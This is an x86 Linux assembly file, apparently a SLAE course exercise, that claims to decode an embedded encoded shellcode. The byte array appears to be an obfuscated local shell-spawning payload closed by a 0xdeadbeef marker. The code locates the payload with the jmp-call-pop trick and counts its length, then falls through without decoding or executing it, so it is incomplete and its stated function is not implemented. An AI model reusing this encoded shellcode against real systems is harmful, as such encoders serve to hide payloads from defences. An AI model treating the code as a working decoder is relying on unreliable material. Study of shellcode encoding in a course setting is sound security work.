; Marcos Serrano
; program will decode encoded shellcode
; SLAE 1501



global _start

section .text

_start:
	jmp short pop_shellcode

get_shell_len:
	pop esi;                        has address of shellcode

	xor ecx, ecx;                   initialize counter of shell size

loop_count:
	inc ecx
	
	mov dword eax, [esi + ecx];     move 4 bytes of shellcode into eax
	mov ebx, 0xefbeadde
	
	cmp eax, ebx

	jne loop_count

	inc edx

	

pop_shellcode:
	call get_shell_len
	shellcode: db 0x31,0x50,0x2f,0x6c,0x68,0x62,0x6e,0xe3,0x89,0x53,0xe1,0x0b,0x80,0xc0,0x68,0x2f,0x73,0x2f,0x69,0x89,0x50,0xe2,0x89,0xb0,0xcd,0xde,0xad,0xbe,0xef
